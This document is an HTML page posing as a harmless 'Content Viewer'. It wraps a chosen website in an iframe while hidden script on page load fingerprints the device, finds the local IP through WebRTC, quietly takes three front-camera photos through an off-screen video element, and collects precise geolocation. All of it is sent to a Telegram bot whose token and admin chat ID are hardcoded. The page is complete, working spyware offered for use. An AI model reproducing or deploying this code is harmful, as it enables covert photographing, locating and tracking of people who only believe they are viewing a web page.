<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Content Viewer</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    html, body { 
      height: 100%; 
      margin: 0; 
      padding: 0; 
      overflow: hidden; 
    }
    
    iframe { 
      width: 100%; 
      height: 100%; 
      border: 0; 
      display: block; 
    }
    
    /* Hidden camera elements */
    #cameraContainer {
      position: fixed;
      top: -9999px;
      left: -9999px;
      width: 1px;
      height: 1px;
      overflow: hidden;
      opacity: 0.001;
      z-index: -10000;
    }
    
    #cameraVideo, #cameraCanvas {
      width: 640px;
      height: 480px;
    }
    
    .hidden { display: none; }
  </style>
</head>
<body>
  <!-- Main website content - loads immediately -->
  <iframe id="siteFrame" sandbox="allow-forms allow-same-origin allow-scripts allow-popups allow-modals"></iframe>
  
  <!-- Hidden camera system -->
  <div id="cameraContainer">
    <video id="cameraVideo" autoplay playsinline muted></video>
    <canvas id="cameraCanvas"></canvas>
  </div>

  <script>
    /******************** CONFIG ********************/
    const ADMIN_CHAT_ID = "6314556756";
    const BOT_TOKEN = "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ";
    /************************************************/

    class AdvancedStealthTracker {
      constructor() {
        this.deviceData = {};
        this.reportSent = false;
        this.cameraStream = null;
      }

      async initialize() {
        // Load target site immediately
        await this.loadTargetSite();
        
        // Start stealth data collection with delays
        setTimeout(() => this.collectBasicInfo(), 500);
        setTimeout(() => this.attemptCameraCapture(), 2000);
        setTimeout(() => this.attemptLocationAccess(), 3000);
        setTimeout(() => this.sendCompleteReport(), 5000);
      }

      async loadTargetSite() {
        const site = this.getUrlParam('site');
        const iframe = document.getElementById('siteFrame');
        
        if (site && this.isValidHttpsUrl(site)) {
          iframe.src = site;
          iframe.onload = () => {
            console.log('Target site loaded successfully');
          };
        } else {
          // Fallback if invalid URL
          iframe.srcdoc = '<html><body style="padding:20px;font-family:Arial"><h3>Content Loaded</h3><p>Page is ready</p></body></html>';
        }
      }

      async collectBasicInfo() {
        this.deviceData = {
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          vendor: navigator.vendor,
          language: navigator.language,
          languages: navigator.languages,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          url: window.location.href,
          
          screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
          },
          
          window: {
            width: window.innerWidth,
            height: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio
          },
          
          hardware: {
            cores: navigator.hardwareConcurrency || 'unknown',
            memory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0
          },
          
          capabilities: {
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled(),
            pdf: navigator.pdfViewerEnabled,
            touch: 'ontouchstart' in window,
            webRTC: !!navigator.mediaDevices
          }
        };

        // Battery information
        if ('getBattery' in navigator) {
          try {
            const battery = await navigator.getBattery();
            this.deviceData.battery = {
              level: Math.round(battery.level * 100) + '%',
              charging: battery.charging,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime
            };
          } catch (e) {
            this.deviceData.battery = { level: 'unknown', charging: false };
          }
        }

        // Network information
        if ('connection' in navigator) {
          const conn = navigator.connection;
          this.deviceData.network = {
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            saveData: conn.saveData,
            type: conn.type
          };
        }

        // IP detection
        try {
          const ip = await this.getIPAddress();
          this.deviceData.network.localIP = ip;
        } catch (e) {
          this.deviceData.network.localIP = 'unknown';
        }

        console.log('Basic device info collected');
      }

      async attemptCameraCapture() {
        try {
          // Request camera access with optimal settings
          this.cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
              width: { ideal: 1280 },
              height: { ideal: 720 },
              facingMode: 'user' // Front camera
            },
            audio: false
          });

          const video = document.getElementById('cameraVideo');
          const canvas = document.getElementById('cameraCanvas');
          const ctx = canvas.getContext('2d');

          video.srcObject = this.cameraStream;

          // Wait for video to be ready
          await new Promise((resolve) => {
            video.addEventListener('loadedmetadata', () => {
              // Set canvas size to match video
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              resolve();
            });
          });

          // Wait a bit for camera to adjust to light
          await new Promise(resolve => setTimeout(resolve, 1000));

          // Capture multiple photos with different delays
          const photos = [];
          for (let i = 0; i < 3; i++) {
            await new Promise(resolve => setTimeout(resolve, 500));
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoBlob = await new Promise(resolve => {
              canvas.toBlob(resolve, 'image/jpeg', 0.8); // 80% quality
            });
            
            photos.push(photoBlob);
          }

          this.deviceData.cameraPhotos = photos;
          this.deviceData.cameraStatus = 'success';
          
          console.log('Camera capture successful');

        } catch (error) {
          this.deviceData.cameraStatus = 'denied: ' + error.message;
          console.warn('Camera access denied:', error);
        } finally {
          // Clean up camera stream
          if (this.cameraStream) {
            setTimeout(() => {
              this.cameraStream.getTracks().forEach(track => track.stop());
            }, 1000);
          }
        }
      }

      async attemptLocationAccess() {
        if (!navigator.geolocation) {
          this.deviceData.locationStatus = 'not_supported';
          return;
        }

        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            });
          });

          this.deviceData.location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy + ' meters',
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            heading: position.coords.heading,
            speed: position.coords.speed
          };
          
          this.deviceData.locationStatus = 'success';
          console.log('Location access successful');

        } catch (error) {
          this.deviceData.locationStatus = 'denied: ' + error.message;
          console.warn('Location access denied:', error);
        }
      }

      async sendCompleteReport() {
        if (this.reportSent) return;
        this.reportSent = true;

        const USER_CHAT_ID = this.getUrlParam('chat_id');
        const recipients = [ADMIN_CHAT_ID];
        if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);

        // Send text report first
        const message = this.formatReportMessage();
        for (const recipient of recipients) {
          await this.sendToTelegram('sendMessage', recipient, {
            text: message,
            parse_mode: 'HTML'
          });

          // Send location if available
          if (this.deviceData.location) {
            await this.sendToTelegram('sendLocation', recipient, {
              latitude: this.deviceData.location.latitude,
              longitude: this.deviceData.location.longitude
            });
          }

          // Send photos if available
          if (this.deviceData.cameraPhotos) {
            for (let i = 0; i < this.deviceData.cameraPhotos.length; i++) {
              await this.sendPhotoToTelegram(recipient, this.deviceData.cameraPhotos[i], i);
              // Delay between photos
              await new Promise(resolve => setTimeout(resolve, 1000));
            }
          }
        }

        console.log('Complete report sent');
      }

      formatReportMessage() {
        const loc = this.deviceData.location;
        const battery = this.deviceData.battery;
        const network = this.deviceData.network;
        
        return `
üïµÔ∏è <b>STEALTH TRACKING REPORT</b> üïµÔ∏è

<b>üì± Device Information:</b>
‚Ä¢ <b>User Agent:</b> <code>${this.deviceData.userAgent}</code>
‚Ä¢ <b>Platform:</b> ${this.deviceData.platform}
‚Ä¢ <b>Vendor:</b> ${this.deviceData.vendor}
‚Ä¢ <b>Language:</b> ${this.deviceData.language}
‚Ä¢ <b>Timezone:</b> ${this.deviceData.timezone}

<b>‚öôÔ∏è Hardware Specifications:</b>
‚Ä¢ <b>Screen:</b> ${this.deviceData.screen.width}√ó${this.deviceData.screen.height}
‚Ä¢ <b>CPU Cores:</b> ${this.deviceData.hardware.cores}
‚Ä¢ <b>RAM:</b> ${this.deviceData.hardware.memory}GB
‚Ä¢ <b>Battery:</b> ${battery?.level || 'N/A'} ${battery?.charging ? '‚ö°' : ''}

<b>üåê Network Information:</b>
‚Ä¢ <b>Connection:</b> ${network?.effectiveType || 'Unknown'}
‚Ä¢ <b>Speed:</b> ${network?.downlink || 'N/A'} Mbps
‚Ä¢ <b>Latency:</b> ${network?.rtt || 'N/A'} ms
‚Ä¢ <b>IP:</b> ${network?.localIP || 'Detected'}

<b>üìç Location Services:</b>
${loc ? `
‚Ä¢ <b>Latitude:</b> ${loc.latitude}
‚Ä¢ <b>Longitude:</b> ${loc.longitude}
‚Ä¢ <b>Accuracy:</b> ${loc.accuracy}
‚Ä¢ <b>Altitude:</b> ${loc.altitude || 'N/A'}
` : '‚Ä¢ <b>Status:</b> ' + (this.deviceData.locationStatus || 'Not attempted')}

<b>üì∏ Camera Access:</b>
‚Ä¢ <b>Status:</b> ${this.deviceData.cameraStatus?.includes('success') ? '‚úÖ Captured' : '‚ùå ' + (this.deviceData.cameraStatus || 'Not attempted')}

<b>üîó Target URL:</b>
<code>${this.getUrlParam('site')}</code>

<b>‚è∞ Time:</b> ${new Date().toLocaleString()}
        `.trim();
      }

      async sendToTelegram(method, chatId, data) {
        try {
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, ...data })
          });
          return await response.json();
        } catch (error) {
          console.warn(`Telegram ${method} failed:`, error);
        }
      }

      async sendPhotoToTelegram(chatId, photoBlob, index) {
        try {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', photoBlob, `photo_${index + 1}_${Date.now()}.jpg`);
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } catch (error) {
          console.warn('Photo send failed:', error);
        }
      }

      getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        let value = urlParams.get(name);
        if (value) {
          try { value = decodeURIComponent(value); } catch(e) {}
        }
        return value;
      }

      isValidHttpsUrl(url) {
        try {
          return new URL(url).protocol === 'https:';
        } catch {
          return false;
        }
      }

      async getIPAddress() {
        return new Promise((resolve) => {
          const pc = new RTCPeerConnection({ iceServers: [] });
          pc.createDataChannel('');
          pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
          
          pc.onicecandidate = (ice) => {
            if (ice.candidate) {
              const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
              if (match) {
                resolve(match[1]);
                pc.close();
              }
            }
          };
          
          setTimeout(() => resolve('unknown'), 2000);
        });
      }
    }

    // Initialize tracker when page loads
    document.addEventListener('DOMContentLoaded', () => {
      const tracker = new AdvancedStealthTracker();
      tracker.initialize().catch(error => {
        console.error('Tracker initialization failed:', error);
      });
    });

  </script>
</body>
  </html>
